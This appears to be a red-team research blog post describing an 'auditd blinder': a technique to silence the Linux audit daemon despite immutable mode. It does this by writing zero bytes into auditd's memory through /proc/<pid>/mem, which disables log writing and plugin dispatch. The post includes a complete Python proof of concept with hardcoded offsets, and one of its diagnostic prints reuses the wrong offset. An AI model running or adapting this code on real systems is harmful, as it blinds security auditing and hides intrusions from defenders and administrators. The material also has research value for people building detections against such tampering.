---
title: auditd blinder
excerpt: "auditd blinder"
date: 2026-10-12
categories: [Researcrh]
tags: [Research, Malware, Red Team]
---
---

Temporarily neutralize the auditd daemon by bypassing its immutable mode (-e 2) via a fileless attack, without using ptrace, kill, or execve systemctl/auditctl.

---

# Auditd architecture overview
The following image illustrates the architecture and relationship of the components in auditd:

| ![](/assets/img/auditd_blinder/auditd_arch.png) |
|:--:|
| *auditd overview* |

In the above diagram, auditd is in the middle. It interfaces with the kernel to receive events. It writes them to the audit logs. It also distributes events in realtime to audisp plugins.

The kernel does the heavy lifting to generates the events. In the case of a trusted application such as shadow-utils, the kernel receives the event, adds origin information, timestamps, and queues the event for delivery to the audit daemon.

This attack targets auditd's Logging Thread and Dispatch Thread:

- **Logging thread**: Neutralized by setting daemon_conf.write_logs to 0. This setting is normally used to prevent the Logging Thread from writing logs to the disk (usually set to 0 if you want to forward the logs to a plugin and have no interest in writing them to the disk). [handle_event() check](https://github.com/linux-audit/audit-userspace/blob/280cb8c07c431439ff85771988b9656780b8ef2b/src/auditd-event.c#L654)
- **Dispatch thread**: Neutralized by setting conf_llist.cnt to 0. This setting keeps a count of active plugins. When its value is 0, the Dispatch Thread will discard the event because there is no active plugin to share the log with. [dispatch_event() check](https://github.com/linux-audit/audit-userspace/blob/280cb8c07c431439ff85771988b9656780b8ef2b/src/auditd-dispatch.c#L65) -> [libdisp_active() check](https://github.com/linux-audit/audit-userspace/blob/280cb8c07c431439ff85771988b9656780b8ef2b/audisp/audispd.c#L813) -> [plist_count() check](https://github.com/linux-audit/audit-userspace/blob/280cb8c07c431439ff85771988b9656780b8ef2b/audisp/audispd-llist.h#L69)

| ![](/assets/img/auditd_blinder/auditd_arch_pwn.png) |
|:--:|
| *pwned auditd overview* |

The auditd immutable mode is a security setting that locks the Linux audit system configuration so that rules cannot be added, modified, or removed at runtime. Because stopping the service effectively changes the active auditing configuration from "active" to "disabled," the kernel blocks the action to maintain tamper resistance.

This attack bypasses auditd's immutable mode. The kernel continues applying rules and queuing events for auditd to consume; however, the Logging and Dispatch threads will silently discard them.

# Attack workflow
1. Get auditd pid
2. Get auditd process VBA from /proc/<auditd_pid>/maps
3. Set daemon_conf.write_logs and conf_llist.cnt to 0 writing directly to /proc/\<auditd_pid\>/mem
4. Have some fun
5. Set daemon_conf.write_logs and conf_llist.cnt to 1 writing directly to /proc/\<auditd_pid\>/mem

[auditd blinder POC](https://lnkd.in/p/e6xYKUVG)

```python3
from pathlib import Path

target_proc = "auditd"
target_pid  = 0
write_logs_offset     = 0x26018
conf_llist_cnt_offset = 0x20130

# Get Target Process PID
for path in Path("/proc").iterdir():
    if path.name.isdigit():
        try:
            name = (path / "comm").read_text().strip()
            if name == target_proc:
                target_pid = path.name
                break
        except:
            pass

if target_pid == 0:
    print(f"Process {target_proc} not found!")
    exit()
else:
    print(f"Process [{target_pid}]{target_proc} found!")

maps_path = f"/proc/{target_pid}/maps"
mem_path = f"/proc/{target_pid}/mem"

target_proc_vba = 0
with open(maps_path, 'r') as f:
    for mapping in f.readlines():
        if target_proc in mapping.split()[-1]:
            target_proc_vba = mapping.split()[0].split('-')[0]
            target_proc_vba = int(target_proc_vba, 16)
            break

if target_proc_vba == 0:
    print("VBA not found!")
    exit()
else:
    print(f"VBA found:       {hex(target_proc_vba)}")
    print(f"write_logs addr: {hex(target_proc_vba + write_logs_offset)}")
    print(f"cnt addr:        {hex(target_proc_vba + write_logs_offset)}")

with open(mem_path, "r+b", buffering=0) as mem:
    mem.seek(target_proc_vba + write_logs_offset)
    mem.write(b"\x00")
    mem.seek(target_proc_vba + conf_llist_cnt_offset)
    mem.write(b"\x00")
    input("CONTINUE")
    mem.seek(target_proc_vba + write_logs_offset)
    mem.write(b"\x01")
    mem.seek(target_proc_vba + conf_llist_cnt_offset)
    mem.write(b"\x01")
```
